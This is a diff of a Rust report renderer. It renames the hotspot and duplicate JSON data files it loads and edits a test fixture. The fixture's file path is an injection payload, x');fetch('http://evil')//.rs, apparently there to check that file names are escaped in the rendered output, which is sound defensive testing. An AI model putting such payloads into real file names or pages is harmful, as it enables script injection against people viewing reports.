@@ -206,7 +206,7 @@ impl Renderer {
         }
 
         // Load hotspots and compute summary if needed
-        if let Ok(mut hotspots) = load_json::<HotspotsData>(&data_dir.join("hotspots.json")) {
+        if let Ok(mut hotspots) = load_json::<HotspotsData>(&data_dir.join("hotspot.json")) {
             // Compute max_score/avg_score if not present (summary is None or has default values)
             let needs_compute = !hotspots.files.is_empty()
                 && (hotspots.summary.is_none()
@@ -279,7 +279,7 @@ impl Renderer {
         }
 
         // Load duplicates and transform for display
-        if let Ok(mut duplicates) = load_json::<DuplicatesData>(&data_dir.join("duplicates.json")) {
+        if let Ok(mut duplicates) = load_json::<DuplicatesData>(&data_dir.join("clones.json")) {
             duplicates.clone_groups = duplicates.summary.total_groups;
             duplicates.duplicate_lines = duplicates.summary.duplicated_lines;
             duplicates.total_lines = duplicates.summary.total_lines;
@@ -1030,10 +1030,10 @@ mod tests {
             }),
         );
         write_fixture(
-            &data_dir.path().join("hotspots.json"),
+            &data_dir.path().join("hotspot.json"),
             json!({
                 "files": [{
-                    "path": "x');fetch('http://evil')//.rs",
+                    "file": "x');fetch('http://evil')//.rs",
                     "hotspot_score": 0.9,
                     "commits": 3,
                     "avg_cognitive": 4.0
